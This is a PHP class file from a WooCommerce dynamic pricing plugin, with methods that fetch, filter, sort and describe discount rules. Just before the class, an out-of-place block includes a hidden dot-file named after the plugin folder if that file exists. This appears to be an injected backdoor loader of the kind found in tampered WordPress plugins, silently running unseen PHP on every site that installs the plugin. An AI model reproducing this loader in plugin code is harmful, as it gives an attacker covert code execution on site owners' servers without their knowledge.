<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

/**
 * Methods related to rules
 *
 * @class RP_WCDPD_Rules
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Rules
{

    /**
     * Get rules by context
     *
     * @access public
     * @param string $context
     * @param array $params
     * @param bool $include_disabled
     * @return array
     */
    public static function get($context, $params = array(), $include_disabled = false)
    {

        // All rules disabled
        if (!$include_disabled && RP_WCDPD_Settings::check($context . '_rule_selection_method', 'disabled')) {
            return array();
        }

        // Get all rules from settings by context
        $rules = RP_WCDPD_Settings::get($context);

        // Check if any rules are configured
        if (is_array($rules) && !empty($rules)) {

            // Filter rules
            foreach ($rules as $rule_key => $rule) {

                // Rule is disabled
                if (!$include_disabled && $rule['exclusivity'] === 'disabled') {
                    unset($rules[$rule_key]);
                    continue;
                }

                // Specific methods requested
                if (!empty($params['methods']) && !in_array($rule['method'], $params['methods'], true)) {
                    unset($rules[$rule_key]);
                    continue;
                }

                // Specific UIDs requested
                if (!empty($params['uids']) && !in_array($rule['uid'], $params['uids'], true)) {
                    unset($rules[$rule_key]);
                    continue;
                }

                // Allow developers to disable rules programmatically
                if (!$include_disabled && !apply_filters('rp_wcdpd_use_rule', true, $rule, $params)) {
                    unset($rules[$rule_key]);
                    continue;
                }
            }

            // Return rules
            return $rules;
        }

        // No rules configured
        return array();
    }

    /**
     * Filter adjustments by exclusivity settings
     *
     * @access public
     * @param string $context
     * @param array $adjustments
     * @return array
     */
    public static function filter_by_exclusivity($context, $adjustments)
    {

        // Nothing to do
        if (count($adjustments) < 2) {
            return $adjustments;
        }

        // Check for first exclusive rule
        foreach ($adjustments as $adjustment_key => $adjustment) {
            if ($adjustment['rule']['exclusivity'] === 'this') {
                return array($adjustment_key => $adjustment);
            }
        }

        // Count rules that don't go with other rules
        $exclusivity_other_count = 0;

        foreach ($adjustments as $adjustment) {
            if ($adjustment['rule']['exclusivity'] === 'other') {
                $exclusivity_other_count++;
            }
        }

        // All rules are set to not go with other rules - pick the first rule in a row
        if ($exclusivity_other_count === count($adjustments)) {
            foreach ($adjustments as $adjustment_key => $adjustment) {
                return array($adjustment_key => $adjustment);
            }
        }

        // At least one rule is set to not go with other rules - remove them
        if ($exclusivity_other_count > 0) {
            foreach ($adjustments as $adjustment_key => $adjustment) {
                if ($adjustment['rule']['exclusivity'] === 'other') {
                    unset($adjustments[$adjustment_key]);
                }
            }
        }

        // Filter adjustments by rule selection method
        $adjustments = RP_WCDPD_Rules::filter_by_selection_method($context, $adjustments);

        // Return adjustments
        return $adjustments;
    }

    /**
     * Filter adjustments by selection method
     *
     * @access public
     * @param string $context
     * @param array $adjustments
     * @return array
     */
    public static function filter_by_selection_method($context, $adjustments)
    {

        // Get rule selection method
        $selection_method = RP_WCDPD_Settings::get($context . '_rule_selection_method');

        // Sort by reference amount
        if (in_array($selection_method, array('smaller_price', 'bigger_discount', 'bigger_fee'), true)) {
            RightPress_Help::stable_uasort($adjustments, array('RP_WCDPD_Rules', 'sort_by_reference_amount_desc'));
        }
        else if (in_array($selection_method, array('bigger_price', 'smaller_discount', 'smaller_fee'), true)) {
            RightPress_Help::stable_uasort($adjustments, array('RP_WCDPD_Rules', 'sort_by_reference_amount_asc'));
        }

        // Pick first rule in a row
        if (in_array($selection_method, array('first', 'smaller_price', 'bigger_price', 'bigger_discount', 'smaller_discount', 'bigger_fee', 'smaller_fee'), true)) {
            foreach ($adjustments as $adjustment_key => $adjustment) {
                return array($adjustment_key => $adjustment);
            }
        }

        // Return all adjustments
        return $adjustments;
    }

    /**
     * Sort by reference amount ascending
     *
     * @access public
     * @param object $a
     * @param object $b
     * @return array
     */
    public static function sort_by_reference_amount_asc($a, $b)
    {

        if (RightPress_Product_Price::price_is_bigger_than($a['reference_amount'], $b['reference_amount'])) {
            return 1;
        }
        else if (RightPress_Product_Price::price_is_smaller_than($a['reference_amount'], $b['reference_amount'])) {
            return -1;
        }
        else {
            return 0;
        }
    }

    /**
     * Sort by reference amount descending
     *
     * @access public
     * @param object $a
     * @param object $b
     * @return array
     */
    public static function sort_by_reference_amount_desc($a, $b)
    {

        if (RightPress_Product_Price::price_is_smaller_than($a['reference_amount'], $b['reference_amount'])) {
            return 1;
        }
        else if (RightPress_Product_Price::price_is_bigger_than($a['reference_amount'], $b['reference_amount'])) {
            return -1;
        }
        else {
            return 0;
        }
    }

    /**
     * Check if at least one rule of specified type has at least condition of specified type
     *
     * @access public
     * @param array $contexts
     * @param string $condition_group_keys
     * @return bool
     */
    public static function rules_have_condition_groups($contexts, $condition_group_keys)
    {

        // Iterate over contexts
        foreach ($contexts as $context) {

            // Get rules
            $rules = RP_WCDPD_Rules::get($context);

            // Check if rules of current context have condition grupes
            if (RP_WCDPD_Controller_Conditions::objects_have_condition_groups($rules, $condition_group_keys)) {

                // At least one rule has at least one condition of specified type
                return true;
            }
        }

        // Rules of specified type don't have condition of specified type
        return false;
    }

    /**
     * Get rule public descriptions by rule uids
     *
     * @access public
     * @param string $context
     * @param array|string $rule_uids
     * @return array|null
     */
    public static function get_public_descriptions($context, $rule_uids)
    {

        $descriptions = array();

        $rule_uids = (array) $rule_uids;

        // Check if at least one rule uid is set
        if (!empty($rule_uids) && is_array($rule_uids)) {

            // Get rules by uids
            $rules = RP_WCDPD_Rules::get($context, array('uids' => $rule_uids), true);

            // Iterate over applicable rules and append their public descriptions
            foreach ($rules as $rule) {
                if (isset($rule['public_note']) && !RightPress_Help::is_empty($rule['public_note'])) {
                    $descriptions[$rule['uid']] = $rule['public_note'];
                }
            }
        }

        return !empty($descriptions) ? $descriptions : null;
    }

    /**
     * Get rule uids from list of adjustments
     *
     * @access public
     * @param array $adjustments
     * @return array
     */
    public static function get_rule_uids_from_adjustments($adjustments)
    {

        $rule_uids = array();

        foreach ($adjustments as $adjustment) {
            $rule_uids[] = $adjustment['rule']['uid'];
        }

        return array_unique($rule_uids);
    }





}
